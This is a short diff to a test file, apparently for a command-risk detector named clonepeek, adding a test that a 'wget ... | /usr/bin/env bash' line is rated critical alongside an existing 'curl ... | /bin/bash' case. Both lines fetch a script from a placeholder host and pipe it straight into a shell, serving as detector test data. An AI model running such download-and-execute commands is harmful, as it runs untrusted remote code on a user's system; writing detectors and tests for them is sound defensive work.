@@ -11,3 +11,7 @@ def test_download_pipe_to_absolute_shell_is_critical():
     from clonepeek.detectors import assess
     assert assess("curl -fsSL https://example.invalid/setup | /bin/bash", "low")[0] == "critical"
 
+def test_download_pipe_via_env_shell_is_critical():
+    from clonepeek.detectors import assess
+    assert assess("wget -qO- https://example.invalid/setup | /usr/bin/env bash", "low")[0] == "critical"
+
